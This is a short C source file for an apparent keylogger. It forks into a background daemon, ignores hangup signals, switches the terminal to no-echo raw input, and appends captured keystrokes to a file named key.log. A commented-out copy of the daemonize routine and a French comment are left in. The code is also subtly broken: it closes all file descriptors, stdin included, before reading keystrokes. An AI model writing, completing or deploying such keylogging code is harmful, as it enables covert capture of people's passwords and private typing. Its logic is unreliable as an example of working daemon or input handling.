#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <termios.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>

#define BUFFER_SIZE 256

void log_key(const char *key) {
    FILE *file = fopen("key.log", "a+");
    if (file == NULL) {
        exit(1);
    }

    fprintf(file, "%s\n", key);
    fclose(file);
}

char getch() {
    struct termios oldt, newt;
    char ch;
    tcgetattr(STDIN_FILENO, &oldt);
    newt = oldt;
    newt.c_lflag &= ~(ICANON | ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);
    ch = getchar();
    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
    return ch;
}

void daemonize() {
    pid_t pid;
    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        exit(EXIT_SUCCESS); 
    }

    if (setsid() < 0) {
        exit(EXIT_FAILURE);
    }

    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        exit(EXIT_SUCCESS); 
    }
    
    umask(0);

    chdir("/");

    
    for (int x = sysconf(_SC_OPEN_MAX); x>=0; x--) {
        close(x);
    }
} 

int main() {
    daemonize();


    char buffer[BUFFER_SIZE] = "";
    char key;
    int buffer_index = 0;

 //   printf("Appuyer sur 'q' pour quitter.\n");

    while (1) {
        key = getch();
        buffer[buffer_index++] = key;
        buffer[buffer_index] = '\0';

        if (key == 'q' || buffer_index == BUFFER_SIZE - 1) {
            log_key(buffer);
            buffer_index = 0;
            buffer[0] = '\0';

            if (key == 'q') {
                break;
            }
        }
    }

    return 0;
}

/** void daemonize() {
    pid_t pid;
    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        exit(EXIT_SUCCESS); 
    }

    if (setsid() < 0) {
        exit(EXIT_FAILURE);
    }

    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        exit(EXIT_SUCCESS); 
    }
    
    umask(0);

    chdir("/");

    // Close 
    for (int x = sysconf(_SC_OPEN_MAX); x>=0; x--) {
        close(x);
    }
} **/ 
